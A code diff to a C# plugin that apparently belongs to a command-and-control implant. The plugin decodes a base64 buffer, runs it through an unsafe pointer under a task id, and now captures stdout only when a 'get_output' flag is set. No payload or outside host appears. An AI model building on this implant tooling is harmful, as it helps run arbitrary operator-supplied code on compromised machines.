@@ -38,7 +38,13 @@ namespace Plugins
                 buffer = Convert.FromBase64String(args["buffer"].ToString());
             }
 
-            if (PluginHandler.StdIsBusy())
+            bool output = false;
+
+            bool.TryParse(args["get_output"], out output);
+
+            Console.WriteLine(output);
+
+            if (PluginHandler.StdIsBusy() && output)
             {
                 PluginHandler.AddResponse(new ResponseResult()
                 {
@@ -54,7 +60,21 @@ namespace Plugins
             {
                 unsafe
                 {
-                    PluginHandler.CaptureStdOut(args["task-id"]);
+                    if (output)
+                    {
+                        if (!PluginHandler.CaptureStdOut(args["task-id"]))
+                        {
+                            PluginHandler.AddResponse(new ResponseResult()
+                            {
+                                completed = "true",
+                                user_output = "Couldn't take over stdout",
+                                task_id = args["task-id"],
+                                status = "success"
+                            });
+                            return;
+                        }
+                    }
+
                     try
                     {
                         fixed (byte* ptr = buffer)
@@ -74,7 +94,12 @@ namespace Plugins
                     {
                         PluginHandler.Write(ex.ToString(), args["task-id"], true, "error");
                     }
-                    PluginHandler.ReleaseStdOut();
+
+                    if (output)
+                    {
+                        PluginHandler.ReleaseStdOut();
+                    }
+                    
                 }
             });
 
